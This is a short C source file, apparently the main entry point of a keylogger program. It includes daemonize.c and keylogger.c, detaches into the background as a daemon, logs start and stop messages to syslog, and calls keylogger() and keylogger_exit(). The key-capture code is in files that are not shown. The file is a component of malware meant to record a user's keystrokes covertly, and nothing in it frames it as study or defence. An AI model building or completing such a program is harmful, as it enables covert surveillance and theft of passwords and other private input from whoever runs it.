#include "daemonize.c"
#include "keylogger.c"

int main()
{
    skeleton_daemon();
    
    while (1)
    {
        syslog (LOG_NOTICE, "Keylogger started.");
        keylogger();
        sleep (20);
        break;
    }
   
    syslog (LOG_NOTICE, "Keylogger terminated.");
    keylogger_exit();
    closelog();
    
    return EXIT_SUCCESS;
}
